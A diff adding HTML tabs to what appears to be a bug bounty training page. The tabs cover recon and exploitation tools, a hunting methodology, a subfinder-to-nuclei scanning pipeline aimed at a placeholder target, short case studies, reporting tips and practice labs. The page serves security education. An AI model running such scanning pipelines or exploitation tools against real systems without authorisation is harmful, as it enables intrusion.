+      <div class="glass-card"><h3 class="text-neon-green">Subfinder / Amass / Chaos</h3><p>Subdomain enumeration</p></div>
+      <div class="glass-card"><h3 class="text-neon-green">httpx / httprobe</h3><p>Alive host probing</p></div>
+      <div class="glass-card"><h3 class="text-neon-green">Katana / Hakrawler</h3><p>Crawlers for JS endpoint extraction</p></div>
+      <div class="glass-card"><h3 class="text-neon-green">gau / waymore</h3><p>Historical URL fetching</p></div>
+      <div class="glass-card"><h3 class="text-neon-green">ffuf / wfuzz / Arjun</h3><p>Fuzzing and parameter discovery</p></div>
+      <div class="glass-card"><h3 class="text-neon-green">nuclei / dalfox / XSStrike</h3><p>Automated vulnerability scanning</p></div>
+      <div class="glass-card"><h3 class="text-neon-green">sqlmap / NoSQLMap</h3><p>SQL injection automation</p></div>
+      <div class="glass-card"><h3 class="text-neon-green">Caido / Burp Suite / mitmproxy</h3><p>HTTP interception & manipulation</p></div>
+      <div class="glass-card"><h3 class="text-neon-green">SSRFmap / interactsh</h3><p>SSRF exploitation & OOB interaction</p></div>
+      <div class="glass-card"><h3 class="text-neon-green">Frida / Objection / JADX</h3><p>Mobile & desktop app reversing</p></div>
+    </div>
+  </div>
+</div>
+
+<!-- ========== METHODOLOGY TAB ========== -->
+<div class="tab-content" id="tab-methodology">
+  <div class="sub-section">
+    <h2 class="sub-section-title">🗺️ The Elite Hunter’s Methodology</h2>
+    <div class="glass-card">
+      <h3 class="text-neon-blue">Recon → Mapping → Input Discovery → Trust Boundaries → Auth Analysis → State Changes → Business Logic → Chaining → Impact Analysis → Reporting</h3>
+      <p>Every phase feeds into the next. Start broad, narrow down, think like an attacker, and always ask “what if?”.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ========== AUTOMATION TAB ========== -->
+<div class="tab-content" id="tab-automation">
+  <div class="sub-section">
+    <h2 class="sub-section-title">🤖 Automation & Scaling – Hunt at Machine Speed</h2>
+    <div class="glass-card">
+      <h3 class="text-neon-blue">1. Recon Pipelines</h3>
+      <p>Chain subfinder, dnsx, httpx, katana, and nuclei with <code>anew</code> for continuous monitoring.</p>
+      <div class="code-block"><pre>subfinder -d target.com | anew subs.txt | dnsx -silent | httpx -silent | katana -silent | anew endpoints.txt | nuclei -t cves/</pre></div>
+    </div>
+    <div class="glass-card mt-3">
+      <h3 class="text-neon-blue">2. GitHub Actions & CI/CD</h3>
+      <p>Schedule scans with GitHub Actions, send alerts to Telegram/Discord on new findings. Use Docker for reproducible environments.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ========== CASE STUDIES TAB ========== -->
+<div class="tab-content" id="tab-cases">
+  <div class="sub-section">
+    <h2 class="sub-section-title">📖 Real‑World Case Studies</h2>
+    <div class="glass-card"><h3 class="text-cyber-red">Shopify – Race Condition on Coupon</h3><p>Concurrent requests allowed multiple uses of a single‑use coupon. Root cause: check and apply not atomic.</p></div>
+    <div class="glass-card mt-3"><h3 class="text-cyber-red">Facebook – GraphQL Auth Bypass</h3><p>Missing resolver‑level authorization allowed deleting any user’s comments. Learned: auth must be checked in every resolver.</p></div>
+    <div class="glass-card mt-3"><h3 class="text-cyber-red">Uber – Subdomain Takeover → OAuth Hijack</h3><p>An unclaimed S3 bucket on a subdomain allowed serving a fake OAuth page, stealing session tokens.</p></div>
+  </div>
+</div>
+
+<!-- ========== MINDSET TAB ========== -->
+<div class="tab-content" id="tab-mindset">
+  <div class="sub-section">
+    <h2 class="sub-section-title">🧠 The Elite Hunter’s Mindset</h2>
+    <div class="glass-card">
+      <h3 class="text-neon-blue">“What does the backend trust from the frontend?”</h3>
+      <p>Always challenge assumptions. Is the role only checked in the UI? Can I skip steps? What if two requests arrive at the same time? What if the cache stores private data?</p>
+    </div>
+  </div>
+</div>
+
+<!-- ========== REPORTING TAB ========== -->
+<div class="tab-content" id="tab-reporting">
+  <div class="sub-section">
+    <h2 class="sub-section-title">📝 Report Writing – Turning Bugs into Bounties</h2>
+    <div class="glass-card">
+      <h3 class="text-neon-blue">1. Proof of Concept</h3>
+      <p>Provide clear reproduction steps, screenshots, and optionally a video. Use minimal, self‑contained payloads.</p>
+    </div>
+    <div class="glass-card mt-3">
+      <h3 class="text-neon-blue">2. Impact & CVSS</h3>
+      <p>Explain the real‑world impact. Use CVSS v3.1 to score the vulnerability. Suggest remediation.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ========== ARCHITECTURE TAB ========== -->
+<div class="tab-content" id="tab-architecture">
+  <div class="sub-section">
+    <h2 class="sub-section-title">🏗️ Modern Web Architecture</h2>
+    <div class="glass-card">
+      <h3 class="text-neon-blue">Microservices, Service Mesh, Edge Functions, CDNs, Serverless</h3>
+      <p>Understanding how systems are built reveals where they break. Learn about service‑to‑service authentication, eventual consistency, and the shared responsibility model in cloud.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ========== LABS TAB ========== -->
+<div class="tab-content" id="tab-labs">
+  <div class="sub-section">
+    <h2 class="sub-section-title">🧪 Hands‑On Labs</h2>
+    <div class="glass-card"><h3 class="text-neon-blue">PortSwigger Web Security Academy</h3><p>The gold standard for web hacking labs. <a href="https://portswigger.net/web-security" target="_blank" class="text-neon-green">🔗</a></p></div>
+    <div class="glass-card mt-3"><h3 class="text-neon-blue">OWASP Juice Shop / DVWA / bWAPP</h3><p>Deliberately vulnerable apps for local practice. <a href="https://github.com/juice-shop/juice-shop" target="_blank" class="text-neon-green">🔗 Juice Shop</a></p></div>
+    <div class="glass-card mt-3"><h3 class="text-neon-blue">Hack The Box / TryHackMe</h3><p>Platforms with dedicated web hacking rooms and retired machines.</p></div>
+  </div>
+</div>
+
+<!-- ========== CHECKLIST TAB ========== -->
+<div class="tab-content" id="tab-checklist">
+  <div class="sub-section">
+    <h2 class="sub-section-title">📋 Bug Bounty Checklist – Don’t Miss a Step</h2>
+    <div id="checklistContainer" class="glass-card p-4"></div>
+  </div>
+</div>
+
+<!-- ========== SERVERS TAB ========== -->
+<div class="tab-content" id="tab-servers">
+  <div class="sub-section">
+    <h2 class="sub-section-title">🚨 Server‑Specific Cheatsheet</h2>
+    <div class="glass-card">
+      <div id="serverTabs" class="server-tabs"></div>
+      <div id="serverContent" class="code-block"><pre></pre></div>
+    </div>
+  </div>
+</div>
